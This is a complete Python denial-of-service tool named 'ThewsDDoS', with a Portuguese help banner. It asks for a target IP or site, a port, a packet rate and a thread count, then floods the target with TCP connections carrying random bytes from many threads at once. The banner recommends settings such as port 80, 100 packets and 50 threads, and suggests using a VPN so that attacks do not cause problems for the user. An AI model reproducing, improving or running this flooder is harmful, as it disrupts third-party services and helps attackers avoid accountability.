import socket
import random
import threading

print(' ')
print(' ThewsDDoS')
print(' ')
print('=================')
print(' --Info/Ajuda--')
print('=================')
print(' ')
print(' • Ferramenta feita por Mathews')
print(' ')
print(' • Use esta ferramenta com cuidado')
print(' ')
print(' • Ferramenta DDoS')
print(' ')
print(' • Não ataque qualquer site, pois pode gerar futuros problemas, ainda mais se voce não usar nenhum tipo de VPN')
print(' ')
print(' • Em Target coloque o ip do site, pode ser tanto o ip numérico dele, quanto o próprio endereço do site')
print(' ')
print(' • Em Port coloque a porta do site, a porta padrão de sites é a 80, então coloque 80')
print(' ')
print(' • Em Packet/s coloque a quantidade de pacotes a serem enviados por segundo ao servidor, recomendado 100')
print(' ')
print(' • Em Threads coloque a quantidade de threads que você deseja, threads é como se fosse robôs, eles irão enviar simultaneamente os pacotes para o servidor de destino, recomendado 50')
print(' ')
print(' ')


ip = str(input('[+] Target: '))
port = int(input('[+] Port: '))
pack = int(input('[+] Packet/s: '))
thread = int(input('[+] Threads: '))


def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print('Atacando '+ip+' | Enviou: '+str(xx))
        except:
            s.close()
            print('Feito')

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
